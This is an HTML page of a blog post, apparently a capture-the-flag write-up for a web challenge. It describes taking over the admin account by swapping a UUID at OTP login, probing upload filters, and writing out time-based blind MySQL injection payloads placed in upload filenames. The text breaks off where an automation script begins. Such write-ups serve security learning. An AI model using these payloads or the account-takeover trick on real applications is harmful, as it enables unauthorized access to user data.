<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Blind Trust" />
<meta property="og:locale" content="en" />
<meta name="description" content="Blind Trust" />
<meta property="og:description" content="Blind Trust" />
<link rel="canonical" href="http://localhost:4000/posts/Blind-Trust/" />
<meta property="og:url" content="http://localhost:4000/posts/Blind-Trust/" />
<meta property="og:site_name" content="Hell‚Äôs Executioner" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-08-04T02:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Blind Trust" />
<meta name="twitter:site" content="@Abo_Elnasr101" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-09-13T03:59:24+02:00","datePublished":"2025-08-04T02:00:00+02:00","description":"Blind Trust","headline":"Blind Trust","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Blind-Trust/"},"url":"http://localhost:4000/posts/Blind-Trust/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Blind Trust | Hell‚Äôs Executioner
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Hell‚Äôs Executioner">
<meta name="application-name" content="Hell‚Äôs Executioner">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css?v=1766790034">

  <!-- Web Font -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Outfit:wght@500;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>
  <script>
document.addEventListener("DOMContentLoaded", function() {
  /* --- Scroll Animations --- */
  var observerOptions = {
    threshold: 0.1,
    rootMargin: "0px 0px -50px 0px"
  };

  var observer = new IntersectionObserver(function(entries) {
    entries.forEach(function(entry) {
      if (entry.isIntersecting) {
        entry.target.classList.add("in-view");
        observer.unobserve(entry.target);
      }
    });
  }, observerOptions);

  var elementsToAnimate = document.querySelectorAll("article h1, article h2, article p, article pre, article img, .post-content > *");
  elementsToAnimate.forEach(function(el) {
    el.classList.add("fade-in-up");
    observer.observe(el);
  });

  /* --- 3D Tilt Effect for Cards --- */
  var cards = document.querySelectorAll(".card, .post-preview");

  cards.forEach(function(card) {
    card.addEventListener("mousemove", function(e) {
      var rect = card.getBoundingClientRect();
      var x = e.clientX - rect.left;
      var y = e.clientY - rect.top;
      
      var centerX = rect.width / 2;
      var centerY = rect.height / 2;
      
      var rotateX = ((y - centerY) / centerY) * -5;
      var rotateY = ((x - centerX) / centerX) * 5;

      card.style.transform = "perspective(1000px) rotateX(" + rotateX + "deg) rotateY(" + rotateY + "deg) scale3d(1.02, 1.02, 1.02)";
      card.style.transition = "transform 0.1s ease";
    });

    card.addEventListener("mouseleave", function() {
      card.style.transform = "perspective(1000px) rotateX(0) rotateY(0) scale3d(1, 1, 1)";
      card.style.transition = "transform 0.5s ease";
    });
  });

  /* --- Typing Effect for Tagline --- */
  var tagline = document.querySelector(".site-subtitle, .tagline");
  if (tagline) {
    var text = tagline.innerText;
    tagline.innerText = "";
    tagline.style.opacity = "1";
    
    var i = 0;
    function typeWriter() {
      if (i < text.length) {
        tagline.innerHTML += text.charAt(i);
        i++;
        setTimeout(typeWriter, 50);
      }
    }
    
    /* Add blinking cursor effect */
    var style = document.createElement("style");
    style.innerHTML = ".site-subtitle::after { content: '|'; animation: blink 1s step-end infinite; } @keyframes blink { 50% { opacity: 0; } }";
    document.head.appendChild(style);
    
    setTimeout(typeWriter, 500);
  }
});
</script>


  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/mem.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">Hell‚Äôs Executioner</a>
    <p class="site-subtitle fst-italic mb-0">Red teaming with a devilish touch.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
   
      

      
        <a
          href="https://github.com/MohamedAboElnasr"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
   
      

      
        <a
          href="https://twitter.com/Abo_Elnasr101"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
   
      

      
        <a
          href="https://www.linkedin.com/in/abo-elnasr"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
   
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['ggta8080','gmail.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
   
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>Blind Trust</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->


 





<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>Blind Trust</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1754265600"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Aug  4, 2025
</time>

      </span>

      <!-- lastmod date -->
      
      <span>
        Updated <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1757728764"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Sep 13, 2025
</time>

      </span>
       

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
           By

          <em>
            
            <a href="https://twitter.com/Abo_Elnasr101">Aboelnasr</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3571 words"
>
  <em>19 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
  <div
    id="toc-bar"
    class="d-flex align-items-center justify-content-between invisible"
  >
    <span class="label text-truncate">Blind Trust</span>
    <button type="button" class="toc-trigger btn me-1">
      <i class="fa-solid fa-list-ul fa-fw"></i>
    </button>
  </div>

  <button
    id="toc-solo-trigger"
    type="button"
    class="toc-trigger btn btn-outline-secondary btn-sm"
  >
    <span class="label ps-2 pe-1"
      >Contents</span
    >
    <i class="fa-solid fa-angle-right fa-fw"></i>
  </button>

  <dialog id="toc-popup" class="p-0">
    <div
      class="header d-flex flex-row align-items-center justify-content-between"
    >
      <div class="label text-truncate py-2 ms-4">Blind Trust</div>
      <button
        id="toc-popup-close"
        type="button"
        class="btn mx-1 my-1 opacity-75"
      >
        <i class="fas fa-close"></i>
      </button>
    </div>
    <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
  </dialog>
  

  <div class="content"><h1 id="blind-trust">Blind Trust</h1>

<p>Hello everyone,
It‚Äôs been a while since I published a write-up. In this one, I‚Äôm going to show you how I managed to solve a web challenge that had zero solves during Arab War Games CTF 2025. Unfortunately, I didn‚Äôt solve it during the competition, but I was the only one who was very close <code class="language-plaintext highlighter-rouge">said by the author</code>.</p>

<hr />

<h2 id="first-part"><span class="me-2">First Part</span><a href="#first-part" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="creating-an-account"><span class="me-2">Creating an account</span><a href="#creating-an-account" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Let‚Äôs start by examining the application and fireup our burp in the background.
First of all, as we can see, the main page only contains simple Login Register and reset password options.</p>

<p><a href="/assets/images/blindtrust/login.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/login.png" alt="" loading="lazy"></a></p>

<p>Let‚Äôs sign up for an account and see what we can find.
Remember, the name of the challenge begins with ‚ÄúBlind‚Äù, which might be a hint ‚Äî possibly pointing toward a Blind SQLi, SSTI, RCE, or something along those lines.</p>

<p>When signing up, we‚Äôre only asked for an email and password ‚Äî no username is required.
I tried registering with dummy credentials like test@corp.com and a simple password like 123, but the application responded with a validation error. It told me that the password must contain uppercase letters and must be at least 8 characters long.</p>

<p><a href="/assets/images/blindtrust/signup.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/signup.png" alt="" loading="lazy"></a></p>

<p>And of course, there‚Äôs a CAPTCHA in place ‚Äî pretty annoying, but it‚Äôs clearly there to prevent brute-force attacks on the login.</p>

<p>after creating my account and tried to login it asked me for an otp
<a href="/assets/images/blindtrust/otp.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/otp.png" alt="" loading="lazy"></a></p>

<p>I tried several ways to bypass it ‚Äî like submitting an empty OTP, null, or 0000 ‚Äî but none of them worked.
I thought, ‚ÄúHmm, that‚Äôs interesting‚Ä¶‚Äù The server is properly validating both the password and the CAPTCHA, which feels pretty realistic.
So I figured ‚Äî why not try providing a valid email address this time?</p>

<p>and that is exactly what i did and i received an otp in mail</p>

<p><a href="/assets/images/blindtrust/otp2.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/otp2.png" alt="" loading="lazy"></a></p>

<h3 id="finding-friends"><span class="me-2">Finding Friends</span><a href="#finding-friends" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>After signing in, we land on a homepage that contains a simple search feature for finding friends.
The first thing that came to my mind was to try searching for keywords like admin, flag, and so on ‚Äî just to see if anything interesting would show up.
<a href="/assets/images/blindtrust/admin.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/admin.png" alt="" loading="lazy"></a></p>

<p>I also searched for flag, but got nothing in return.
Then I added the admin, hoping to find something useful ‚Äî but unfortunately, that didn‚Äôt yield any interesting results either.</p>

<p>After inspecting the page, I noticed that each user returned from the search had a UUID associated with them.
<a href="/assets/images/blindtrust/uuid.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/uuid.png" alt="" loading="lazy"></a></p>

<p>That immediately got me thinking: why not try to take over another user‚Äôs account?
That‚Äôs exactly what I set out to do.</p>

<p>The question was ‚Äî how could I achieve that?
Would it be through password reset via email confusion? Or maybe by sending two OTP requests simultaneously (Race Condition), hoping the server might generate identical OTPs for both accounts? I brainstormed a lot of possible attack vectors.</p>

<p>Eventually, I realized it was much simpler than that ‚Äî it was all about the login process itself.
When entering the OTP during login, all I needed to do was replace my UUID with the admin‚Äôs UUID (which I had found earlier by inspecting the page).</p>

<p>So, let‚Äôs do that and see what happens.
<a href="/assets/images/blindtrust/adminlogin.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/adminlogin.png" alt="" loading="lazy"></a></p>

<p>And we‚Äôre in!</p>

<h3 id="upload-functionality"><span class="me-2">Upload Functionality</span><a href="#upload-functionality" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>We landed on a homepage that includes an upload functionality.
<a href="/assets/images/blindtrust/upload.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/upload.png" alt="" loading="lazy"></a>
we know that application is runing a php so why not trying to upload a php web shell?
<a href="/assets/images/blindtrust/png.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/png.png" alt="" loading="lazy"></a></p>

<p>We discovered that only <code class="language-plaintext highlighter-rouge">.png</code> files are allowed for upload. So, I go back to <strong>Burp Suite</strong> to explore ways to bypass this restriction using different techniques.</p>

<p>Some of the ideas I tried included:</p>

<ul>
  <li>Changing the file name to end with <code class="language-plaintext highlighter-rouge">%00.png</code> (null byte injection),</li>
  <li>Modifying the <code class="language-plaintext highlighter-rouge">Content-Type</code> header,</li>
  <li>Spoofing the MIME type or magic bytes in the uploaded file.</li>
</ul>

<p>It turned out the server was performing two checks:</p>

<ol>
  <li><strong>The file name must end with <code class="language-plaintext highlighter-rouge">.png</code></strong>, and</li>
  <li><strong>The file‚Äôs MIME type must match the magic bytes of a valid PNG image</strong> .</li>
</ol>

<p>So far, so good ‚Äî but wait, how are we even supposed to find our uploaded files?
That question had me stuck with this approach for a while.</p>

<p>There was an /uploads endpoint, but it was restricted ‚Äî every time I tried accessing it directly, it returned a 403 Forbidden error.
<a href="/assets/images/blindtrust/403.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/403.png" alt="" loading="lazy"></a>
I also asked the author what the upload feature was supposed to lead us to, and he told me that the file names are randomized, so there‚Äôs no way to find the uploaded files ‚Äî and that there was nothing more to see.
Or at least, that‚Äôs what I thought.
I ended up leaving the challenge at that point. All of this happened during the first hour of the competition, and I had to shift my focus to other challenges that were already solved ‚Äî I didn‚Äôt want to let my team down.</p>

<p>The next day, after solving a few other web and mobile challenges, I told myself, ‚ÄúWhy not go back to that challenge? Maybe there‚Äôs a clue I missed.‚Äù
But before diving back in, I asked the author to release a hint, since no one had solved the challenge yet ‚Äî and he did.
He mentioned something about ‚Äúblind‚Äù, but didn‚Äôt clarify what exactly he meant.</p>

<p>That immediately got me thinking of two possibilities: <strong>Blind RCE</strong> or <strong>Blind SQLi</strong>.
But wait ‚Äî all we have is a <strong>file upload</strong> feature. So think with me for a second and ask yourself:</p>

<blockquote>
  <p><em>Where could you possibly find SQL injection in a file upload?</em></p>
</blockquote>

<p>Yup ‚Äî it‚Äôs the <strong>filename</strong>.</p>

<p>If you guessed that‚Ä¶ you‚Äôre a hero :‚ÄùD</p>

<p>Unfortunately, by that point, the competition was very close to ending.
Even the author gave me one final hint ‚Äî the database was <strong>MySQL</strong> and it‚Äôs time based. but couldn‚Äôt solve it at the time</p>

<hr />

<h2 id="second-part"><span class="me-2">Second Part</span><a href="#second-part" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h2 id="-a-quick-note"><span class="me-2">üìù A Quick Note</span><a href="#-a-quick-note" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Before continuing with how I solved the challenge, I want to share a quick opinion:</p>

<blockquote>
  <p><strong>This challenge should have included a source code review.</strong></p>
</blockquote>

<p>Having access to the code would have been extremely helpful in understanding what we were dealing with ‚Äî especially considering how limited the time was.</p>

<p>Unfortunately, without access to the source and with the clock ticking, it made the challenge very guessy as it contains filtred keywaords.</p>

<h3 id="finding-an-oracle-and-bypassing-filter"><span class="me-2">Finding an oracle and bypassing filter</span><a href="#finding-an-oracle-and-bypassing-filter" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>i tried to use querys like</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>------geckoformboundarybdbbbcfdab28124d8e8805dfdeec32ac
Content-Disposition: form-data; name="file"; filename="Select Sleep(1)--.png"
Content-Type: application/octet-stream
</pre></td></tr></tbody></table></code></div></div>

<p>But the server returned an <strong>empty response</strong>, which indicated that something was wrong ‚Äî maybe a filter is begin used? ü§∑‚Äç‚ôÇÔ∏è
<a href="/assets/images/blindtrust/burp1.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/burp1.png" alt="" loading="lazy"></a></p>

<p>So I started playing around with the queries a little bit, and it turned out that if a request contained a <strong>filtered keyword</strong>, the server would simply respond with <strong>nothing at all</strong> and if the query is invalid it will return <strong>uploaded</strong> with no body .</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>------geckoformboundarybdbbbcfdab28124d8e8805dfdeec32ac
Content-Disposition: form-data; name="file"; filename="SeLect BENCHMArK(10000000,md5(1))-- -.png"
Content-Type: application/octet-stream
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/images/blindtrust/burp2.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/burp2.png" alt="" loading="lazy"></a>
this one returned a longer response time which indicated that the query was valid.</p>

<h3 id="the-oracle"><span class="me-2">the oracle</span><a href="#the-oracle" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>now it‚Äôs time to enumerate the data base tables and columns but first let‚Äôs get the current database that we are in after playing around with the payload to work i finally manged to get it right.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>------geckoformboundarybdbbbcfdab28124d8e8805dfdeec32ac
Content-Disposition: form-data; name="file"; filename="Select CaSE WHEN MID(DATABASE(),1,1)='b' THEN BENCHMArK(10000000,MD5(1)) ELSE 0 END-- -.png
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/images/blindtrust/burp3.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/burp3.png" alt="" loading="lazy"></a></p>

<p>now let‚Äôs automate this process to get the fullname of the database, with the help my friends chat and grok they helped me to build a multithreading script to automate this</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
